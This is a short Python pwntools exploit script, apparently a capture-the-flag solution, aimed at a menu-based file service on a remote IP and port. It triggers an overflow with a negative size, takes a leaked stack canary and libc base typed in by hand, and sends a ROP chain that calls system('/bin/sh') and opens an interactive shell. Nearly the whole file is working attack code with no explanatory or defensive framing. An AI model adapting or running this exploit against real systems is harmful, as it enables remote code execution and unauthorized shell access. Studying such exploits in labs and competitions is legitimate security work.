#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.6"
#port = 9999
host = "104.236.0.107"
port =11111

r = remote(host,port)
def write(filename,s):
    s.recvuntil(">")
    s.sendline("1")
    s.recvuntil(":")
    s.sendline(filename)

def read(filename,s):
    s.recvuntil(">")
    s.sendline("2")
    s.recvuntil(":")
    s.sendline(filename)

def go_write(size,key,data,s):
    s.recvuntil(">")
    s.sendline("3")
    s.recvuntil(">")
    s.sendline(str(size))
    s.recvuntil(">")
    s.sendline(data)
    s.recvuntil(">")
    s.sendline(key)

def go_read(filename,key,s):
    s.recvuntil(">")
    s.sendline("3")
    s.recvuntil(">")
    s.sendline(key)

#for exploit

write("ddaa",r)
go_write(-1,"fuck","nogg",r)
data = r.recvuntil("written")
write("orange",r)
canary = int(raw_input("canary:"),16)
libc = int(raw_input("libc:"),16)
pop_rdi = libc + 0x0000000000021102
system = libc + 0x45390
sh = libc + 0x18cd57
go_write(-1,"fuck","\x00"*0x408 + p64(canary) + p64(0) + p64(pop_rdi) + p64(sh) + p64(system),r)
r.recvuntil(">")
r.sendline("4")
r.interactive()
